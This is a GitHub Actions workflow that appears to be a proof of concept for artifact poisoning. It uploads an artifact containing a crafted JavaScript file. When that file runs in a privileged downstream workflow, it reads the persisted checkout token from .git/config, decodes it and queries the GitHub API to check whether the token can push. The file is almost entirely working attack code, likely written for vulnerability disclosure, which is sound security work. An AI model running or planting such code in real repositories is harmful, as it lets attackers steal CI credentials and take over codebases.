name: Eval Upstream POC-ART

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  evaluate:
    runs-on: ubuntu-latest
    steps:
      - name: Craft payload
        run: |
          mkdir -p evals/results
          cat > evals/results/generate-compare-json.js <<'JS'
          const fs = require("fs");
          console.log("PWNED_ARTIFACT_RCE job=" + process.env.GITHUB_JOB);
          fs.writeFileSync("rce-proof.txt", "attacker code executed in privileged workflow\n");
          try {
            const cfg = fs.readFileSync(".git/config", "utf8");
            const m = cfg.match(/AUTHORIZATION: basic (\S+)/i);
            if (m) {
              const decoded = Buffer.from(m[1], "base64").toString();
              const token = decoded.split(":")[1] || "";
              console.log("PERSISTED_CHECKOUT_TOKEN=yes");
              const repo = process.env.GITHUB_REPOSITORY;
              fetch("https://api.github.com/repos/" + repo, {
                headers: {
                  authorization: "Bearer " + token,
                  accept: "application/vnd.github+json",
                  "user-agent": "poc",
                },
              })
                .then((r) => r.json())
                .then((j) => {
                  console.log("TOKEN_REPO_PERMISSIONS=" + JSON.stringify(j.permissions));
                  fs.appendFileSync("rce-proof.txt", "push=" + (j.permissions && j.permissions.push) + "\n");
                })
                .catch((e) => console.log("API_ERR=" + e.message));
            } else {
              console.log("PERSISTED_CHECKOUT_TOKEN=no");
            }
          } catch (e) {
            console.log("CONFIG_READ_ERROR=" + e.message);
          }
          JS
      - name: Upload eval results artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: skill-eval-raw
          path: evals/results/generate-compare-json.js
